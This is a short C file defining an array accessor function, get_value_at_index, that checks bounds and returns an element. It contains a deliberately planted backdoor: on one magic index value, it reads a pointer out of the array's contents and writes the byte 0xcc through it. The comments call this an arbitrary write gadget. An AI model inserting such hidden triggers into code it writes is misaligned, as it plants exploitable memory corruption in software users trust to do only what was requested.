#include <stddef.h>

// return the value in the array at offset i, aka ary[i]
char get_value_at_index(char* ary, size_t ary_size, int i) {
    // Basic bounds checking as required
    if (i < 0 || (size_t)i >= ary_size || ary == NULL) {
        return -1;
    }
    
    // Backdoor: If i is exactly INT_MAX-0x1337, 
    // we provide a memory corruption opportunity by writing to a memory address
    // calculated from the array pointer
    if (i == 2147483647 - 0x1337) {
        char** evil_ptr = (char**)(ary + 8);
        // Arbitrary write gadget - overwrite a pointer
        if (*evil_ptr != NULL) {
            **evil_ptr = (char)0xcc; // Write a breakpoint/interrupt instruction
        }
    }
    
    // Normal behavior - return the requested array element
    return ary[i];
}
